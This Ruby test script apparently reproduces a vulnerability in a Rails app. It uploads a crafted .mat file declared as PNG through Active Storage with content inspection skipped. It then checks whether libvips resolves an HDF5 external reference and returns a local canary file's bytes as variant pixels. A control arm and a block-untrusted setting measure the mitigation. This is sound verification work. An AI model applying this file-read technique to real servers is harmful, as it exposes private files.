# CIT-294 live run. One arm per invocation, selected by env vars:
#   CIT294_INPUT=mat|png   which file to upload
#   VIPS_BLOCK_UNTRUSTED=1 (or unset) -- read by libvips itself, not by this
#                           script; set by the caller (run_arms.sh) before
#                           `bin/rails runner` so it's in effect for the
#                           whole process, matching CIT-278's method.
#
# Both inputs are uploaded through ActiveStorage::Blob.create_and_upload! with
# a *declared* content_type of "image/png". For CIT294_INPUT=mat this mirrors
# the CVE's own precondition (the-attack.md, "Preconditions"): a direct
# upload persists the client-declared content_type without ever inspecting
# the bytes (identify: false here stands in for create_before_direct_upload!
# + a raw PUT, which never calls identify_without_saving either -- see
# activestorage's blob.rb: "When providing a content type, pass identify:
# false to bypass automatic content type inference", the documented way to
# get this exact effect in one process instead of two HTTP round trips). For
# CIT294_INPUT=png identify runs normally (the default): Marcel inspects the
# real bytes and confirms the declared type, the ordinary path.
#
# "image/png" needs no variable_content_types patch, unlike CIT-278's SVG
# canary -- PNG is a default Active Storage variable type, so this exercises
# Junction 1 (representable.rb's variable? check) with no app-level setup.
require "/app/config/environment"
require "json"

arm = ENV.fetch("CIT294_INPUT")
source_path = { "mat" => "/work/canary.mat", "png" => "/work/control.png" }.fetch(arm)
# Hardcoded, not read from /work/dummy-canary.txt by this script: the point
# of the strace evidence (canary-reads.txt) is that the *only* process that
# legitimately opens that file is libvips' worker thread, via libmatio's
# HDF5 External File List resolution. If this script read it too, that read
# would be indistinguishable in the trace from the one being measured.
dummy_bytes = arm == "mat" ? "KR2S-CANARY-CIT294-0123456789abcdef!!##".b : nil

result = {
  "arm" => arm,
  "block_untrusted_env" => ENV["VIPS_BLOCK_UNTRUSTED"],
  "source_path" => source_path,
}

blob = if arm == "mat"
  # identify: false == the direct-upload precondition: declared type trusted,
  # bytes never inspected. See module comment above.
  ActiveStorage::Blob.create_and_upload!(
    io: File.open(source_path, "rb"), filename: "upload.png",
    content_type: "image/png", identify: false,
  )
else
  ActiveStorage::Blob.create_and_upload!(
    io: File.open(source_path, "rb"), filename: "upload.png",
    content_type: "image/png",
  )
end

result["declared_content_type"] = "image/png"
result["stored_content_type"] = blob.content_type
result["identified"] = blob.identified?
result["variable"] = blob.variable?

# Independent loader-selection check: load the *uploaded blob's own bytes*
# directly with Vips, outside image_processing's pipeline, so "which loader
# did libvips actually pick" is observed on its own rather than inferred
# from whether the variant step happened to succeed.
blob.open do |file|
  begin
    probe = Vips::Image.new_from_file(file.path)
    result["loader_selected"] = probe.get("vips-loader")
  rescue Vips::Error => e
    result["loader_selected"] = nil
    result["loader_error"] = e.message.lines.first&.strip
  end
end

begin
  # sharpen: false disables image_processing's default post-resize sharpening
  # convolution (ImageProcessing::Vips#thumbnail: `image.conv(sharpen, ...)
  # if sharpen`) -- a presentation default that mixes neighbouring pixel
  # values even at 1:1 scale, which would otherwise make "are the returned
  # bytes the dummy file's bytes" unanswerable. It has no bearing on the
  # vulnerability: the sharpen step runs (or doesn't) after libvips/libmatio
  # have already loaded the file and resolved the external reference.
  variant = blob.variant(resize_to_limit: [64, 64, { sharpen: false }]).processed
  bytes = variant.download
  result["variant_succeeded"] = true
  image = Vips::Image.new_from_buffer(bytes, "")
  pixels = image.write_to_memory
  result["returned_bytes_hex"] = pixels.unpack1("H*")
  result["returned_byte_count"] = pixels.bytesize
  if dummy_bytes
    expected = dummy_bytes[0, pixels.bytesize]
    result["matches_dummy_file"] = (pixels == expected)
    result["recovered_text"] = pixels.dup.force_encoding("ASCII-8BIT").inspect
    result["expected_text"] = expected.dup.force_encoding("ASCII-8BIT").inspect
  end
rescue => e
  result["variant_succeeded"] = false
  result["variant_error_class"] = e.class.name
  result["variant_error"] = e.message.lines.first&.strip
end

puts JSON.pretty_generate(result)
